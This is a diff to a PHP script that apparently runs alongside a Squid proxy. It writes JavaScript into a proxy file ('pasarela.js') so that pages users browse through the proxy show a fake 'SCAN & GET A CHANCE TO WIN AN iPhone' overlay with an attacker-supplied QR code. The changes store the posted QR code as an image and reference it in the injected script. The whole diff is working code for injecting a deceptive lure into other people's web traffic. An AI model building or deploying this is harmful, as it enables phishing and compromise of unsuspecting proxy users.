@@ -1,6 +1,10 @@
 <?php
-$domain = 'http://127.0.0.1';
+const QRDATA = 'qr.data';
+const QRIMAGE = 'tmp.jpg';
 const PASARELA = '/etc/squid/pasarela.js';
+
+$domain = 'http://127.0.0.1';
+$img_source = $domain.'/proxyboard/'.QRIMAGE;
 
 function inject_qr($src){
 $pasarela = <<<MARKER
@@ -23,7 +27,7 @@ function lightbox_close(){
   document.getElementById('fade').style.display='none';
 }
 document.body.insertAdjacentHTML('beforeend', '<div id="light"><strong>SCAN & GET A CHANCE TO WIN AN iPhone</strong><br/> \
-  <img src="data:image/png;base64,$src" /></div><div id="fade" onclick="lightbox_close();"></div>');
+  <img src="$src" /></div><div id="fade" onclick="lightbox_close();"></div>');
 MARKER;
 return $pasarela;
 }
@@ -33,23 +37,23 @@ function update_pasarela($content, $mode){
     fwrite($fp, $content);
     fclose($fp);
 }
+//Function to convert the base64 to image file
+function base64_to_jpeg($base64_string, $file){
+    $fp = fopen($file, "wb"); 
+    $data = explode(',', $base64_string);
+    fwrite($fp, base64_decode($data[1])); 
+    fclose($fp); 
+}
 ?>
 
 <?php
   if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['c'])){
-    $src = $_POST['c'];
-    if(file_exists(PASARELA)){
-        $qr = trim(file_get_contents(PASARELA));
-        $pattern = '/src=\"data:image\/png;base64,(.+?)\"/';
-        preg_match($pattern, $qr, $matches);
-        if(!empty($matches)){
-          $qr = preg_replace("/$matches[1]/", $src, $qr);
-        }
-        else{
-          $qr = inject_qr($src);
-        }
-        update_pasarela($qr, 'a');
-    }
+    $qrdata= htmlspecialchars($_POST['c'] , ENT_QUOTES);
+
+    //Format the data and write the QR data to a local file
+    $qrdata= str_replace(" ", "+", $qrdata);
+    file_put_contents(QRDATA, $qrdata);
+    base64_to_jpeg($qrdata, QRIMAGE);
     exit;
   }
   else if(!isset($_GET['f'])){
@@ -58,6 +62,14 @@ function update_pasarela($content, $mode){
   }
   else{
     header('Content-Type: application/javascript');
+    if(file_exists(PASARELA)){
+      $qr = trim(file_get_contents(PASARELA));
+      $search = '<img src="'.$img_source.'" />';
+      if(!strpos($qr, $search)){
+        $qr = inject_qr($img_source);
+        update_pasarela($qr, 'a');
+      }
+    }
   }
 ?>
 
